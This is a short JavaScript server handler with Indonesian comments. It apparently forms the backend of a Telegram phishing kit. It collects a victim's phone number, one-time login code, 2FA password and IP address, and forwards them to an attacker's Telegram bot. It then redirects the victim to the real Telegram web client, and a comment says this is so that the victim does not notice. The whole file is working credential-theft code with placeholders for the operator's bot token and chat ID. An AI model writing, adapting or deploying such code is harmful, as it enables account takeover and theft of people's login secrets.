export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ message: 'Method not allowed' });
    }

    const { phone, otp, password } = req.body;
    const botToken = 'TOKEN_BOT_ANDA'; // GANTI INI
    const chatId = 'ID_CHAT_ANDA';     // GANTI INI

    const text = `⚠️ **Hasil Tangkapan Baru!** ⚠️\n\n` +
                 `📱 **No HP:** \`${phone}\`\n` +
                 `🔑 **OTP:** \`${otp}\`\n` +
                 `🔐 **2FA:** \`${password || 'Tidak ada'}\`\n` +
                 `🌐 **IP:** ${req.headers['x-forwarded-for'] || req.socket.remoteAddress}`;

    try {
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: text,
                parse_mode: 'Markdown'
            })
        });

        // Lempar korban ke situs asli agar tidak sadar
        res.redirect(302, 'https://web.telegram.org/k/');
    } catch (error) {
        res.status(500).json({ error: 'Gagal mengirim data' });
    }
}
